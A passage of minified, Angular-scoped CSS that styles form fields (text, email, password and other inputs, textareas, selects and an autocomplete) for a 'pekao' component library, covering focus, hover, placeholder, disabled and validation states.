textarea{border-top-right-radius:0!important;border-bottom-right-radius:0!important;border-right:0!important}.pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22], .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22], .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=email], .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=number], .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=password], .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=search], .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=tel], .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=text], .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     pekao-select, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     textarea{padding-right:62px;text-overflow:ellipsis;cursor:pointer;transition:none}.pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]   .fake-input.focused[_ngcontent-tvb-c22], .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]:focus, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]   .readonly.focused[_ngcontent-tvb-c22], .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22]:focus, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=email].focused, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=email]:focus, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=number].focused, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=number]:focus, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=password].focused, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=password]:focus, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=search].focused, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=search]:focus, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=tel].focused, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=tel]:focus, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=text].focused, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     input[type=text]:focus, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field.focused, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field:focus, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     pekao-select.focused, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     pekao-select:focus, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     textarea.focused, .pekao-autocomplete[_nghost-tvb-c22]   .field-container[_ngcontent-tvb-c22]     textarea:focus{outline:0;border-color:transparent;box-shadow:0 0 10px 0 rgba(0,0,0,.3)}.field-container[_ngcontent-tvb-c22]{display:inline-block;width:100%}.field-container[_ngcontent-tvb-c22]   label[_ngcontent-tvb-c22]{display:flex;align-items:center;height:20px;padding-bottom:10px;font-size:11px;font-weight:600;line-height:11px;color:#2f3234;text-transform:uppercase;letter-spacing:1px}.field-container[_ngcontent-tvb-c22]   label[_ngcontent-tvb-c22]     pekao-tooltip-icon{margin-bottom:3px;margin-left:3px}.field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]     input[type=email], .field-container[_ngcontent-tvb-c22]     input[type=number], .field-container[_ngcontent-tvb-c22]     input[type=password], .field-container[_ngcontent-tvb-c22]     input[type=search], .field-container[_ngcontent-tvb-c22]     input[type=tel], .field-container[_ngcontent-tvb-c22]     input[type=text], .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field, .field-container[_ngcontent-tvb-c22]     pekao-select, .field-container[_ngcontent-tvb-c22]     textarea{box-sizing:border-box;box-shadow:none;-webkit-appearance:none;-moz-appearance:none;appearance:none;width:100%;height:40px;line-height:40px;padding:4px 20px 0;font-size:16px;font-weight:400;color:#2f3234;background:#fff;border:1px solid #b4b4b4;border-radius:4px;transition:.2s ease-in-out,border-radius}.field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]::-ms-clear, .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22]::-ms-clear, .field-container[_ngcontent-tvb-c22]     input[type=email]::-ms-clear, .field-container[_ngcontent-tvb-c22]     input[type=number]::-ms-clear, .field-container[_ngcontent-tvb-c22]     input[type=password]::-ms-clear, .field-container[_ngcontent-tvb-c22]     input[type=search]::-ms-clear, .field-container[_ngcontent-tvb-c22]     input[type=tel]::-ms-clear, .field-container[_ngcontent-tvb-c22]     input[type=text]::-ms-clear, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field::-ms-clear, .field-container[_ngcontent-tvb-c22]     pekao-select::-ms-clear, .field-container[_ngcontent-tvb-c22]     textarea::-ms-clear{display:none}.field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=email]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=number]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=password]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=search]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=tel]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=text]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     pekao-select:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     textarea:-ms-input-placeholder{color:#b4b4b4}.field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]   .placeholder[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]::-moz-placeholder, .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22]   .placeholder[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22]::-moz-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=email] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=email]::-moz-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=number] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=number]::-moz-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=password] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=password]::-moz-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=search] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=search]::-moz-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=tel] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=tel]::-moz-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=text] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=text]::-moz-placeholder, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field .placeholder, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field::-moz-placeholder, .field-container[_ngcontent-tvb-c22]     pekao-select .placeholder, .field-container[_ngcontent-tvb-c22]     pekao-select::-moz-placeholder, .field-container[_ngcontent-tvb-c22]     textarea .placeholder, .field-container[_ngcontent-tvb-c22]     textarea::-moz-placeholder{color:#b4b4b4}.field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]   .placeholder[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22]   .placeholder[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=email] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=email]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=number] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=number]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=password] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=password]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=search] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=search]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=tel] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=tel]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     input[type=text] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=text]:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field .placeholder, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     pekao-select .placeholder, .field-container[_ngcontent-tvb-c22]     pekao-select:-ms-input-placeholder, .field-container[_ngcontent-tvb-c22]     textarea .placeholder, .field-container[_ngcontent-tvb-c22]     textarea:-ms-input-placeholder{color:#b4b4b4}.field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]   .placeholder[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]::placeholder, .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22]   .placeholder[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22]::placeholder, .field-container[_ngcontent-tvb-c22]     input[type=email] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=email]::placeholder, .field-container[_ngcontent-tvb-c22]     input[type=number] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=number]::placeholder, .field-container[_ngcontent-tvb-c22]     input[type=password] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=password]::placeholder, .field-container[_ngcontent-tvb-c22]     input[type=search] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=search]::placeholder, .field-container[_ngcontent-tvb-c22]     input[type=tel] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=tel]::placeholder, .field-container[_ngcontent-tvb-c22]     input[type=text] .placeholder, .field-container[_ngcontent-tvb-c22]     input[type=text]::placeholder, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field .placeholder, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field::placeholder, .field-container[_ngcontent-tvb-c22]     pekao-select .placeholder, .field-container[_ngcontent-tvb-c22]     pekao-select::placeholder, .field-container[_ngcontent-tvb-c22]     textarea .placeholder, .field-container[_ngcontent-tvb-c22]     textarea::placeholder{color:#b4b4b4}@media (hover:hover),screen and (-ms-high-contrast:active),(-ms-high-contrast:none){.field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]:hover, .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22]:hover, .field-container[_ngcontent-tvb-c22]     input[type=email]:hover, .field-container[_ngcontent-tvb-c22]     input[type=number]:hover, .field-container[_ngcontent-tvb-c22]     input[type=password]:hover, .field-container[_ngcontent-tvb-c22]     input[type=search]:hover, .field-container[_ngcontent-tvb-c22]     input[type=tel]:hover, .field-container[_ngcontent-tvb-c22]     input[type=text]:hover, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field:hover, .field-container[_ngcontent-tvb-c22]     pekao-select:hover, .field-container[_ngcontent-tvb-c22]     textarea:hover{border-color:#2f3234;box-shadow:none}.field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)   .fake-input[_ngcontent-tvb-c22]:hover   .field-suffix[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)   .fake-input[_ngcontent-tvb-c22]:hover ~ .field-button[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)   .readonly[_ngcontent-tvb-c22]:hover   .field-suffix[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)   .readonly[_ngcontent-tvb-c22]:hover ~ .field-button[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=email]:hover .field-suffix, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=email]:hover~.field-button, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=number]:hover .field-suffix, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=number]:hover~.field-button, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=password]:hover .field-suffix, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=password]:hover~.field-button, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=search]:hover .field-suffix, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=search]:hover~.field-button, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=tel]:hover .field-suffix, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=tel]:hover~.field-button, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=text]:hover .field-suffix, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     input[type=text]:hover~.field-button, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     pekao-masked-input-field:hover .field-suffix, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     pekao-masked-input-field:hover~.field-button, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     pekao-select:hover .field-suffix, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     pekao-select:hover~.field-button, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     textarea:hover .field-suffix, .field-container[_ngcontent-tvb-c22]:not(.invalid):not(.warning):not(.focused)     textarea:hover~.field-button{border-color:#2f3234}}.field-container[_ngcontent-tvb-c22]   .fake-input.focused[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]:focus, .field-container[_ngcontent-tvb-c22]   .readonly.focused[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22]:focus, .field-container[_ngcontent-tvb-c22]     input[type=email].focused, .field-container[_ngcontent-tvb-c22]     input[type=email]:focus, .field-container[_ngcontent-tvb-c22]     input[type=number].focused, .field-container[_ngcontent-tvb-c22]     input[type=number]:focus, .field-container[_ngcontent-tvb-c22]     input[type=password].focused, .field-container[_ngcontent-tvb-c22]     input[type=password]:focus, .field-container[_ngcontent-tvb-c22]     input[type=search].focused, .field-container[_ngcontent-tvb-c22]     input[type=search]:focus, .field-container[_ngcontent-tvb-c22]     input[type=tel].focused, .field-container[_ngcontent-tvb-c22]     input[type=tel]:focus, .field-container[_ngcontent-tvb-c22]     input[type=text].focused, .field-container[_ngcontent-tvb-c22]     input[type=text]:focus, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field.focused, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field:focus, .field-container[_ngcontent-tvb-c22]     pekao-select.focused, .field-container[_ngcontent-tvb-c22]     pekao-select:focus, .field-container[_ngcontent-tvb-c22]     textarea.focused, .field-container[_ngcontent-tvb-c22]     textarea:focus{outline:0;border-color:#2f3234}.field-container[_ngcontent-tvb-c22]   .fake-input.readonly[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .fake-input[disabled][_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .fake-input[readonly][_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .readonly.readonly[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .readonly[disabled][_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .readonly[readonly][_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]     input[type=email].readonly, .field-container[_ngcontent-tvb-c22]     input[type=email][disabled], .field-container[_ngcontent-tvb-c22]     input[type=email][readonly], .field-container[_ngcontent-tvb-c22]     input[type=number].readonly, .field-container[_ngcontent-tvb-c22]     input[type=number][disabled], .field-container[_ngcontent-tvb-c22]     input[type=number][readonly], .field-container[_ngcontent-tvb-c22]     input[type=password].readonly, .field-container[_ngcontent-tvb-c22]     input[type=password][disabled], .field-container[_ngcontent-tvb-c22]     input[type=password][readonly], .field-container[_ngcontent-tvb-c22]     input[type=search].readonly, .field-container[_ngcontent-tvb-c22]     input[type=search][disabled], .field-container[_ngcontent-tvb-c22]     input[type=search][readonly], .field-container[_ngcontent-tvb-c22]     input[type=tel].readonly, .field-container[_ngcontent-tvb-c22]     input[type=tel][disabled], .field-container[_ngcontent-tvb-c22]     input[type=tel][readonly], .field-container[_ngcontent-tvb-c22]     input[type=text].readonly, .field-container[_ngcontent-tvb-c22]     input[type=text][disabled], .field-container[_ngcontent-tvb-c22]     input[type=text][readonly], .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field.readonly, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field[disabled], .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field[readonly], .field-container[_ngcontent-tvb-c22]     pekao-select.readonly, .field-container[_ngcontent-tvb-c22]     pekao-select[disabled], .field-container[_ngcontent-tvb-c22]     pekao-select[readonly], .field-container[_ngcontent-tvb-c22]     textarea.readonly, .field-container[_ngcontent-tvb-c22]     textarea[disabled], .field-container[_ngcontent-tvb-c22]     textarea[readonly]{background:#eee;border-color:#dbdbdb;color:#b4b4b4;cursor:not-allowed}.field-container[_ngcontent-tvb-c22]   .fake-input.readonly[_ngcontent-tvb-c22]:focus, .field-container[_ngcontent-tvb-c22]   .fake-input[disabled][_ngcontent-tvb-c22]:focus, .field-container[_ngcontent-tvb-c22]   .fake-input[readonly][_ngcontent-tvb-c22]:focus, .field-container[_ngcontent-tvb-c22]   .readonly.readonly[_ngcontent-tvb-c22]:focus, .field-container[_ngcontent-tvb-c22]   .readonly[disabled][_ngcontent-tvb-c22]:focus, .field-container[_ngcontent-tvb-c22]   .readonly[readonly][_ngcontent-tvb-c22]:focus, .field-container[_ngcontent-tvb-c22]     input[type=email].readonly:focus, .field-container[_ngcontent-tvb-c22]     input[type=email][disabled]:focus, .field-container[_ngcontent-tvb-c22]     input[type=email][readonly]:focus, .field-container[_ngcontent-tvb-c22]     input[type=number].readonly:focus, .field-container[_ngcontent-tvb-c22]     input[type=number][disabled]:focus, .field-container[_ngcontent-tvb-c22]     input[type=number][readonly]:focus, .field-container[_ngcontent-tvb-c22]     input[type=password].readonly:focus, .field-container[_ngcontent-tvb-c22]     input[type=password][disabled]:focus, .field-container[_ngcontent-tvb-c22]     input[type=password][readonly]:focus, .field-container[_ngcontent-tvb-c22]     input[type=search].readonly:focus, .field-container[_ngcontent-tvb-c22]     input[type=search][disabled]:focus, .field-container[_ngcontent-tvb-c22]     input[type=search][readonly]:focus, .field-container[_ngcontent-tvb-c22]     input[type=tel].readonly:focus, .field-container[_ngcontent-tvb-c22]     input[type=tel][disabled]:focus, .field-container[_ngcontent-tvb-c22]     input[type=tel][readonly]:focus, .field-container[_ngcontent-tvb-c22]     input[type=text].readonly:focus, .field-container[_ngcontent-tvb-c22]     input[type=text][disabled]:focus, .field-container[_ngcontent-tvb-c22]     input[type=text][readonly]:focus, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field.readonly:focus, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field[disabled]:focus, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field[readonly]:focus, .field-container[_ngcontent-tvb-c22]     pekao-select.readonly:focus, .field-container[_ngcontent-tvb-c22]     pekao-select[disabled]:focus, .field-container[_ngcontent-tvb-c22]     pekao-select[readonly]:focus, .field-container[_ngcontent-tvb-c22]     textarea.readonly:focus, .field-container[_ngcontent-tvb-c22]     textarea[disabled]:focus, .field-container[_ngcontent-tvb-c22]     textarea[readonly]:focus{box-shadow:none}@media (hover:hover){.field-container[_ngcontent-tvb-c22]   .fake-input.readonly[_ngcontent-tvb-c22]:hover, .field-container[_ngcontent-tvb-c22]   .fake-input[disabled][_ngcontent-tvb-c22]:hover, .field-container[_ngcontent-tvb-c22]   .fake-input[readonly][_ngcontent-tvb-c22]:hover, .field-container[_ngcontent-tvb-c22]   .readonly.readonly[_ngcontent-tvb-c22]:hover, .field-container[_ngcontent-tvb-c22]   .readonly[disabled][_ngcontent-tvb-c22]:hover, .field-container[_ngcontent-tvb-c22]   .readonly[readonly][_ngcontent-tvb-c22]:hover, .field-container[_ngcontent-tvb-c22]     input[type=email].readonly:hover, .field-container[_ngcontent-tvb-c22]     input[type=email][disabled]:hover, .field-container[_ngcontent-tvb-c22]     input[type=email][readonly]:hover, .field-container[_ngcontent-tvb-c22]     input[type=number].readonly:hover, .field-container[_ngcontent-tvb-c22]     input[type=number][disabled]:hover, .field-container[_ngcontent-tvb-c22]     input[type=number][readonly]:hover, .field-container[_ngcontent-tvb-c22]     input[type=password].readonly:hover, .field-container[_ngcontent-tvb-c22]     input[type=password][disabled]:hover, .field-container[_ngcontent-tvb-c22]     input[type=password][readonly]:hover, .field-container[_ngcontent-tvb-c22]     input[type=search].readonly:hover, .field-container[_ngcontent-tvb-c22]     input[type=search][disabled]:hover, .field-container[_ngcontent-tvb-c22]     input[type=search][readonly]:hover, .field-container[_ngcontent-tvb-c22]     input[type=tel].readonly:hover, .field-container[_ngcontent-tvb-c22]     input[type=tel][disabled]:hover, .field-container[_ngcontent-tvb-c22]     input[type=tel][readonly]:hover, .field-container[_ngcontent-tvb-c22]     input[type=text].readonly:hover, .field-container[_ngcontent-tvb-c22]     input[type=text][disabled]:hover, .field-container[_ngcontent-tvb-c22]     input[type=text][readonly]:hover, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field.readonly:hover, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field[disabled]:hover, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field[readonly]:hover, .field-container[_ngcontent-tvb-c22]     pekao-select.readonly:hover, .field-container[_ngcontent-tvb-c22]     pekao-select[disabled]:hover, .field-container[_ngcontent-tvb-c22]     pekao-select[readonly]:hover, .field-container[_ngcontent-tvb-c22]     textarea.readonly:hover, .field-container[_ngcontent-tvb-c22]     textarea[disabled]:hover, .field-container[_ngcontent-tvb-c22]     textarea[readonly]:hover{box-shadow:none}}.field-container[_ngcontent-tvb-c22]   .fake-input.ng-touched.ng-invalid[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]   .readonly.ng-touched.ng-invalid[_ngcontent-tvb-c22], .field-container[_ngcontent-tvb-c22]     input[type=email].ng-touched.ng-invalid, .field-container[_ngcontent-tvb-c22]     input[type=number].ng-touched.ng-invalid, .field-container[_ngcontent-tvb-c22]     input[type=password].ng-touched.ng-invalid, .field-container[_ngcontent-tvb-c22]     input[type=search].ng-touched.ng-invalid, .field-container[_ngcontent-tvb-c22]     input[type=tel].ng-touched.ng-invalid, .field-container[_ngcontent-tvb-c22]     input[type=text].ng-touched.ng-invalid, .field-container[_ngcontent-tvb-c22]     pekao-masked-input-field.ng-touched.ng-invalid, .field-container[_ngcontent-tvb-c22]     pekao-select.ng-touched.ng-invalid, .field-container[_ngcontent-tvb-c22]     textarea.ng-touched.ng-invalid{border:1px solid #ac1419;border-bottom-left-radius:0;border-bottom-right-radius:0}.field-container.closed-messages[_ngcontent-tvb-c22]   .fake-input.ng-touched.ng-invalid[_ngcontent-tvb-c22], .field-container.closed-messages[_ngcontent-tvb-c22]   .readonly.ng-touched.ng-invalid[_ngcontent-tvb-c22], .field-container.closed-messages[_ngcontent-tvb-c22]     input[type=email].ng-touched.ng-invalid, .field-container.closed-messages[_ngcontent-tvb-c22]     input[type=number].ng-touched.ng-invalid, .field-container.closed-messages[_ngcontent-tvb-c22]     input[type=password].ng-touched.ng-invalid, .field-container.closed-messages[_ngcontent-tvb-c22]     input[type=search].ng-touched.ng-invalid, .field-container.closed-messages[_ngcontent-tvb-c22]     input[type=tel].ng-touched.ng-invalid, .field-container.closed-messages[_ngcontent-tvb-c22]     input[type=text].ng-touched.ng-invalid, .field-container.closed-messages[_ngcontent-tvb-c22]     pekao-masked-input-field.ng-touched.ng-invalid, .field-container.closed-messages[_ngcontent-tvb-c22]     pekao-select.ng-touched.ng-invalid, .field-container.closed-messages[_ngcontent-tvb-c22]     textarea.ng-touched.ng-invalid{border-bottom-left-radius:4px;border-bottom-right-radius:4px}.field-container.closed-messages[_ngcontent-tvb-c22]     .field-button:last-of-type, .field-container.closed-messages[_ngcontent-tvb-c22]     .field-suffix:last-of-type{border-bottom-right-radius:4px}.field-container[_ngcontent-tvb-c22]   .messages-container[_ngcontent-tvb-c22]{border-bottom-right-radius:4px;border-bottom-left-radius:4px;overflow:hidden}.field-container.warning[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22], .field-container.warning[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22], .field-container.warning[_ngcontent-tvb-c22]     input[type=email], .field-container.warning[_ngcontent-tvb-c22]     input[type=number], .field-container.warning[_ngcontent-tvb-c22]     input[type=password], .field-container.warning[_ngcontent-tvb-c22]     input[type=search], .field-container.warning[_ngcontent-tvb-c22]     input[type=tel], .field-container.warning[_ngcontent-tvb-c22]     input[type=text], .field-container.warning[_ngcontent-tvb-c22]     pekao-masked-input-field, .field-container.warning[_ngcontent-tvb-c22]     pekao-select, .field-container.warning[_ngcontent-tvb-c22]     textarea{border:1px solid #f56500;border-bottom-left-radius:0;border-bottom-right-radius:0}.field-container.large[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22], .field-container.large[_ngcontent-tvb-c22]   .readonly[_ngcontent-tvb-c22], .field-container.large[_ngcontent-tvb-c22]     input[type=email], .field-container.large[_ngcontent-tvb-c22]     input[type=number], .field-container.large[_ngcontent-tvb-c22]     input[type=password], .field-container.large[_ngcontent-tvb-c22]     input[type=search], .field-container.large[_ngcontent-tvb-c22]     input[type=tel], .field-container.large[_ngcontent-tvb-c22]     input[type=text], .field-container.large[_ngcontent-tvb-c22]     pekao-masked-input-field, .field-container.large[_ngcontent-tvb-c22]     pekao-select{height:50px;line-height:50px}.field-container.large[_ngcontent-tvb-c22]   .fake-input[_ngcontent-tvb-c22]{overflow:hidden;white-space:nowrap;text-overflow:ellipsis;padding-top:0}.field-container[_ngcontent-tvb-c22]     pekao-select{padding:0}.field-container[_ngcontent-tvb-c22]     textarea{display:block;resize:none;height:auto;min-height:100px;padding-top:14px;padding-bottom:14px;line-height:1.31}.field-container[_ngcontent-tvb-c22]     textarea[pekaoTextareaAutoExpand]{overflow:hidden}.field-container[_ngcontent-tvb-c22]     input, .field-container[_ngcontent-tvb-c22]     textarea{-webkit-transform:translateZ(0)}.field-and-buttons[_ngcontent-tvb-c22]{display:flex}.focused[_ngcontent-tvb-c22]   .field-and-buttons[_ngcontent-tvb-c22]{border-color:#2f3234}@media (hover:hover),screen and (-ms-high-contrast:active),(-ms-high-contrast:none){[_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover   .fake-input[_ngcontent-tvb-c22], [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover   .readonly[_ngcontent-tvb-c22], [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover     .field-button, [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover     .field-suffix, [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover     input[type=email], [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover     input[type=number], [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover     input[type=password], [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover     input[type=search], [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover     input[type=tel], [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   